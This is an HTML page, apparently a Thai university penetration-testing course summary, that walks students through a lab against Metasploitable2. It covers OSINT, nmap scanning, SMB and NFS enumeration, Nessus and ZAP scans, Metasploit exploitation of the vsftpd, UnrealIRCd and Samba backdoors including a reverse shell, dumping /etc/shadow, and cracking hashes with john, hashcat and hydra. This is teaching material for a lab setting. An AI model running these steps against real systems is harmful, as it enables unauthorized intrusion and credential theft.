@@ -1,0 +1,191 @@
+<!doctype html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>S2A — Command &amp; Lab Steps + เกล็ดความรู้</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="a4.css">
+</head>
+<body>
+
+  <nav class="navbar">
+    <div class="nav-inner">
+      <a href="index.html" class="brand"><img src="icon.jpg" alt="PenTest Logo" class="brand-logo">Roadmap</a>
+      <a href="summary1.html" title="สรุป A4 แนวนอน หน้า 1/2 (L1-L3)">S1</a>
+      <a href="summary2.html" title="สรุป A4 แนวนอน หน้า 2/2 (L4-L6)">S2</a>
+      <a href="summary1a.html" title="สรุปทฤษฎีสอบข้อเขียน (Roadmap+L1-L6)">S1A</a>
+      <a href="summary2a.html" class="active" title="สรุป Command/Lab Steps + เกล็ดความรู้">S2A</a>
+      <a href="L1.html">L1</a>
+      <a href="L2.html">L2</a>
+      <a href="L3.html">L3</a>
+      <a href="L4.html">L4</a>
+      <a href="L5.html">L5</a>
+      <a href="L6.html">L6</a>
+      <a href="L7.html">L7</a>
+    </div>
+  </nav>
+
+  <main class="sheet">
+
+    <header class="sheet-head">
+      <img src="icon.jpg" alt="logo" class="cs-logo">
+      <h1>S2A · Command &amp; Lab Steps — ไล่ทีละขั้น + 💡เกล็ดความรู้ (L2→L7 workflow)</h1>
+      <div class="pager"><a class="home" href="index.html">Home</a><a href="summary1.html">S1</a><a href="summary2.html">S2</a><a href="summary1a.html">← S1A</a></div>
+    </header>
+
+    <div class="cols">
+
+    <!-- ================= STEP 0 ================= -->
+    <section class="sec">
+      <div class="sec-h"><span>Step 0 · เตรียมสนาม + กฎการเก็บหลักฐาน</span><small>L1 Lab</small></div>
+      <ol>
+        <li>เปิด Kali + Metasploitable2 บน VirtualBox/VMware → network mode <b>Host-Only / Internal</b></li>
+        <li><code>ip a</code> — เช็ก Kali ได้ IP ในวง lab (เช่น 192.168.56.x)</li>
+        <li><code>ping -c 4 &lt;Target_IP&gt;</code> — ยืนยันคุยกันได้ ไม่มี packet loss</li>
+        <li>เตรียมโฟลเดอร์เก็บผล: <code>mkdir -p ~/Pentest_Labs/LabX</code> + wordlist ด้วย <code>nano user_list.txt</code></li>
+      </ol>
+      <p class="step">💡 <b>กฎหลักฐาน:</b> capture ทุกคำสั่ง+ผลลัพธ์ทุก step · ตั้งชื่อไฟล์ Section+Lab+รหัส เช่น S1L3_6604061234567.pdf — report คือของจริงของ pentester</p>
+      <p class="step">💡 ping ไม่ตอบ ≠ เครื่องตาย — target อาจปิด ICMP ให้ไป scan ต่อได้เลย</p>
+    </section>
+
+    <!-- ================= STEP 1 ================= -->
+    <section class="sec">
+      <div class="sec-h"><span>Step 1 · Passive Recon (OSINT)</span><small>ยิงไม่มี log — L2</small></div>
+      <ol>
+        <li>โดเมน: <code>whois target.com</code> → เจ้าของ/registrar/NS/dates</li>
+        <li>DNS: <code>nslookup -type=ns target.com</code>, <code>-type=mx</code>, <code>host -a target.com</code></li>
+        <li>Zone transfer: <code>dig @&lt;IP&gt; vulnerablelab.com AXFR</code> (lab: เพิ่ม IP ใน /etc/hosts ก่อน)</li>
+        <li>Dorking: <code>site:target.com filetype:pdf</code>, <code>inurl:admin</code>, <code>intitle:"index of"</code>, <code>ext:sql|log</code></li>
+        <li>Email/subdomain: <code>theHarvester -d kmutnb.ac.th -b yahoo</code> (นับ emails/hosts)</li>
+        <li>recon-ng: <code>marketplace install hackertarget</code> → <code>modules load hackertarget</code> → <code>options set source vulnweb.com</code> → <code>run</code> → <code>show hosts</code></li>
+        <li>Shodan web: filter <code>port:</code>,<code>org:</code>,<code>country:TH</code>,<code>product:"Apache"</code></li>
+      </ol>
+      <p class="step">💡 AXFR สำเร็จ = ได้แผนที่ subdomain ทั้งเซิร์ฟ = ช่องโหว่ config ชั้นเยี่ยม (จดเป็น finding)</p>
+      <p class="step">💡 MX record บอกผู้ให้บริการเมล → รู้ format อีเมล → ใช้ทำ phishing list / brute-force list</p>
+      <p class="step">💡 dork ฝังใน exploit บน GHDB (exploit-db) — ค้นเวอร์ชันช่องโหว่ผ่านกูเกิ้ลได้</p>
+    </section>
+
+    <!-- ================= STEP 2 ================= -->
+    <section class="sec">
+      <div class="sec-h"><span>Step 2 · Scanning (Nmap)</span><small>Active — L3</small></div>
+      <ol>
+        <li>หาเป้า: <code>nmap -sn 192.168.56.0/24</code> → จด IP target</li>
+        <li>Stealth top-1000: <code>sudo nmap -sS &lt;IP&gt;</code></li>
+        <li>เจาะจง: <code>nmap -sT -p 21,80,445 &lt;IP&gt;</code></li>
+        <li>เวอร์ชัน: <code>nmap -sV &lt;IP&gt;</code> → จด Apache/vsFTPd/OpenSSH+version</li>
+        <li>OS: <code>sudo nmap -O -T4 &lt;IP&gt;</code></li>
+        <li>ครบชุด: <code>sudo nmap -A &lt;IP&gt;</code></li>
+        <li>ทุก port: <code>nmap -p- &lt;IP&gt;</code> / เร็วมาก: <code>sudo masscan --ports 0-65535 &lt;IP&gt;</code></li>
+        <li>เก็บไฟล์: <code>-oN mscan.txt</code> → <code>cat mscan.txt</code> · ทุก format <code>-oA lab3_scan_results</code></li>
+        <li>Full exercise: <code>sudo nmap -sS -sV -sC -p- -T5 &lt;IP&gt; -o nmaplist.txt</code> → <code>ls</code>/<code>cat</code> เทียบไม่ใส่ -sC</li>
+      </ol>
+      <p class="step">💡 -sS ต้อง sudo (สร้าง raw packet) · -sT ไม่ต้องแต่โดน log · เวอร์ชันที่ได้ = "ที่อยู่ของ CVE" ใน Step 4–5</p>
+      <p class="step">💡 -T4/T5 เร็วแต่ดัง — ใน scope จริงใช้ T2-T3 กัน IDS; masscan เหมาะวงใหญ่ แล้วค่อย nmap เจาะรายตัว</p>
+      <p class="step">💡 บันทึก output ทุกครั้ง (-oN/-oA) = หลักฐานใน report + ใช้ grep/XML ต่อได้</p>
+    </section>
+
+    <!-- ================= STEP 3 ================= -->
+    <section class="sec">
+      <div class="sec-h"><span>Step 3 · Enumeration</span><small>ลึกขึ้น — L4</small></div>
+      <ol>
+        <li>SMB version/share: <code>nmap -sV -p 139,445 &lt;IP&gt;</code> → <code>smbclient -L \\&lt;IP&gt;</code> (Enter = anonymous)</li>
+        <li>Users/Groups/OS: <code>enum4linux -a &lt;IP&gt;</code> (ย่อย: -U users, -G groups, -S shares, -o OS)</li>
+        <li>SMBMap สิทธิ์ share: <code>smbmap -H &lt;IP&gt;</code> (R/W ที่ไหนบ้าง)</li>
+        <li>RPC/NFS: <code>rpcinfo -p &lt;IP&gt;</code> + <code>showmount -e &lt;IP&gt;</code></li>
+        <li>NetBIOS: <code>nbtscan -v -s : 192.168.56.0/24</code> / <code>nmap --script nbstat.nse -p137-139 &lt;IP&gt;</code></li>
+        <li>Web path ซ่อน: <code>nmap -p 80,443 --script http-enum &lt;IP&gt;</code> → /phpMyAdmin/, /phpinfo.php</li>
+        <li>Nikto: <code>nikto -h &lt;IP&gt;</code></li>
+        <li>User list NSE: <code>nmap --script smb-enum-users.nse &lt;IP&gt;</code> (+groups/-shares/-processes มี creds)</li>
+      </ol>
+      <p class="step">💡 showmount เห็น "/" = export ทั้ง root filesystem = finding หนักมาก จดไว้ยิงตอน exploit</p>
+      <p class="step">💡 share ที่ write ได้ (เช่น /tmp) = จุดวาง payload/หลักฐาน — ทดสอบ: <code>smbclient //&lt;IP&gt;/tmp</code> → <code>mkdir &lt;studentID&gt;</code> → <code>ls</code> (นี่คือโจทย์ Lab!)</p>
+      <p class="step">💡 enum4linux ได้ผลเมื่อ target อนุญาต anonymous (RestrictAnonymous=0) — Metasploitable2 เปิดไว้ให้ฝึก</p>
+    </section>
+
+    <!-- ================= STEP 4 ================= -->
+    <section class="sec">
+      <div class="sec-h"><span>Step 4 · Vulnerability Assessment</span><small>หา CVE + ให้คะแนน — L5</small></div>
+      <ol>
+        <li>อัปเดต scripts: <code>sudo nmap --script-updatedb</code></li>
+        <li>สแกน vuln ทั้งเครื่อง: <code>nmap --script vuln &lt;IP&gt;</code> → รอผล เจอ e.g. <code>ftp-vsftpd-backdoor</code> (CVE-2011-2523), <code>ssl-poodle</code> (CVE-2014-3566)</li>
+        <li>FTP anonymous: <code>nmap --script ftp-anon &lt;IP&gt;</code></li>
+        <li>SSH auth: <code>nmap --script ssh-auth-methods.nse &lt;IP&gt;</code></li>
+      </ol>
+      <p class="step">💡 เปลี่ยน script finding → CVE number → เช็ก CVSS band (Critical ≥9) → จัดลำดับตัวไหนยิงก่อน = หัวใจ VA</p>
+      <h3 style="font-size:8.2pt;color:#0e6655;margin:5px 0 2px;">Nessus (host/network scanner)</h3>
+      <ol>
+        <li><code>sudo dpkg -i Nessus-*.deb</code> → <code>sudo systemctl start nessusd</code></li>
+        <li>Browser <code>https://localhost:8834</code> → register Essentials (code ทาง email)</li>
+        <li>New Scan → <b>Basic Network Scan</b> → name + targets (IP/range/subnet/domain)</li>
+        <li>(optional Schedule) → Save → <b>Launch</b></li>
+        <li>จบแล้ว: แท็บ Vulnerabilities → filter CRITICAL/HIGH → อ่าน Description+Solution จด port/service</li>
+      </ol>
+      <h3 style="font-size:8.2pt;color:#0e6655;margin:5px 0 2px;">OWASP ZAP (webapp)</h3>
+      <ol>
+        <li><code>sudo apt install zaproxy</code> → เปิดโปรแกรม → Standard UI → Persist (.zap)</li>
+        <li>Firefox proxy manual HTTP+SSL = <code>127.0.0.1:8080</code> ✓HTTPS</li>
+        <li>ติดตั้ง CA: เข้า <code>http://zap/</code> → download → import cert</li>
+        <li>Browse <code>http://&lt;Target_IP&gt;/</code> → คลิกขวา host → Attack → Active Scan (หรือ Quick Start Automated)</li>
+        <li>ดู Alerts (RCE CVE-2012-1823, Path Traversal, Missing headers) → Report → HTML</li>
+      </ol>
+      <p class="step">💡 Nessus=มุมกว้างทั้ง host/network · ZAP=มุมลึกเฉพาะ web layer — Assignment p84 ให้เทียบสองตัวนี้ + ระบุ CRITICAL อยู่ port/service ไหน</p>
+      <p class="step">💡 false positive เยอะ — ก่อนเขียน report ให้ยืนยัน manual (เช่น nmap -sV ซ้ำ / ลอง PoC ใน Step 5)</p>
+    </section>
+
+    <!-- ================= STEP 5 ================= -->
+    <section class="sec">
+      <div class="sec-h"><span>Step 5 · Exploitation</span><small>ยิงจริง — L6</small></div>
+      <div class="sub">Metasploit workflow 8 ขั้น (ใช้ซ้ำได้ทุกช่องโหว่)</div>
+      <p><code>msfconsole</code> → <code>search vsftpd|cve:xxxx</code> → <code>use exploit/…</code> → <code>show payloads</code> → <code>set PAYLOAD …</code> → <code>show options</code> → <code>set RHOSTS …</code>(+LHOST ถ้า reverse) → <code>exploit</code></p>
+      <ol>
+        <li><b>21 vsftpd:</b> use exploit/unix/ftp/vsftpd_234_backdoor → set RHOSTS → exploit → root! ตรวจ: <code>id</code>, <code>uname -a</code>, <code>whoami</code></li>
+        <li><b>Alt script:</b> <code>searchsploit vsftpd 2.3.4</code> → <code>-m 49757</code> → <code>python2 49757.py &lt;IP&gt;</code></li>
+        <li><b>22 SSH brute:</b> nano meta.txt (user/pass pairs) → use auxiliary/scanner/ssh/ssh_login → RHOSTS + STOP_ON_SUCCESS true + USERPASS_FILE → exploit → <code>sessions -i 1</code></li>
+        <li><b>23 Telnet:</b> banner บอก msfadmin/msfadmin → telnet IP -l msfadmin → id/uname</li>
+        <li><b>25 SMTP:</b> auxiliary/scanner/smtp/smtp_enum + THREADS → usernames (ยืนยัน nc VRFY)</li>
+        <li><b>6667 UnrealIRCd:</b> exploit/unix/irc/unreal_ircd_3281_backdoor → PAYLOAD cmd/unix/reverse → set LHOST(Kali)+LPORT 4444 → exploit (target โทรกลับ)</li>
+        <li><b>5900 VNC:</b> search vnc login → RHOSTS → exploit ('password')</li>
+        <li><b>139/445 Samba:</b> nmap --script vulners เห็น 3.0.20 → smb_version ยืนยัน → searchsploit samba 3.0.20 → usermap_script (use 0) → exploit → root</li>
+        <li><b>1524 Ingreslock:</b> <code>nc -nv &lt;IP&gt; 1524</code> → root ทันที (ไม่ต้อง exploit!)</li>
+        <li><b>3632 DISTCC:</b> service postgresql start ก่อน → payload bind_ruby → exploit</li>
+        <li><b>5432 Postgres:</b> postgres_login + STOP_ON_SUCCESS true</li>
+        <li><b>2049 NFS:</b> rpcinfo -p / showmount -e (ดู export)</li>
+      </ol>
+      <p class="step">💡 หลังได้ shell ทุกครั้ง: whoami → uname -a → ifconfig/ip a → ls สำรวจ = "ยืนยัน foothold" ใน report</p>
+      <p class="step">💡 Reverse shell = target โทรกลับ LHOST (ผ่าน NAT/FW) · Bind = target เปิด port รอเราโทรเข้า — เลือก reverse เป็น default</p>
+      <p class="step">💡 version ที่เจอใน Step 2–3 = ตัวชี้ว่าใช้ module ไหน — เจาะไม่ตรงเวอร์ชัน = crash เปล่า</p>
+    </section>
+
+    <!-- ================= STEP 6 ================= -->
+    <section class="sec">
+      <div class="sec-h"><span>Step 6 · Post-Exploitation → Crack</span><small>L6→L7 สะพานสุดท้าย</small></div>
+      <ol>
+        <li>บน target (root): <code>cat /etc/shadow</code> → copy รายการ hash กลับ Kali → <code>nano meta_shadow</code></li>
+        <li>John: <code>john --format=crypt meta_shadow</code> / ใส่ wordlist <code>--wordlist=/usr/share/wordlists/rockyou.txt</code> → ดูผล <code>john --show meta_shadow</code></li>
+        <li>Hashcat: <code>hashcat -m 500 -a 0 meta_shadow_cut rockyou.txt</code> (-m500=md5crypt; $6$ ใช้ -m1800 sha512crypt)</li>
+        <li>Online brute: <code>hydra -L users.txt -P passwords.txt &lt;IP&gt; ftp</code> (ssh/telnet เปลี่ยน service ท้ายคำ) → ยืนยัน login จริง</li>
+        <li>WiFi: <code>aircrack-ng -w rockyou.txt -b &lt;MAC&gt; cap*.cap</code></li>
+        <li>Cleanup: ลบ account/artifact ที่ฝัง · จดทุก step เขียน report (Exec Summary/Findings/Risk/Recs)</li>
+      </ol>
+      <p class="step">💡 อ่าน prefix ทรู hash: $1$=MD5 · $2a$=bcrypt · $5$=SHA256 · $6$=SHA512 · $y$=yescrypt · ไม่มี=DES → เลือก -m ให้ถูก</p>
+      <p class="step">💡 rockyou ต้องแตกก่อน: <code>sudo gzip -d /usr/share/wordlists/rockyou.txt.gz</code> · นับจำนวน <code>wc -l</code></p>
+      <p class="step">💡 Assignment p96: mkdir studentID ใน //IP/tmp จาก Kali + ยืนยัน ls -l ฝั่ง Metasploitable2 — พิสูจน์ write access = post-exploit evidence</p>
+      <div class="note-s"><strong>จบเกม:</strong> Setup → Recon → Scan → Enumerate → VA → Exploit → Post/Crack — ทำตามสายพานนี้ทุกครั้ง = pentester ที่โจรต้องยอกล้อง 🎯</div>
+    </section>
+
+
+
+
+    </div>
+
+    <div class="sheet-foot">
+      <span>S2A — Command/Lab Steps + เกล็ดความรู้ (ไล่ตาม PTES)</span>
+      <span>ทฤษฎีอยู่ที่ S1A</span>
+    </div>
+  </main>
+</body>
+</html>
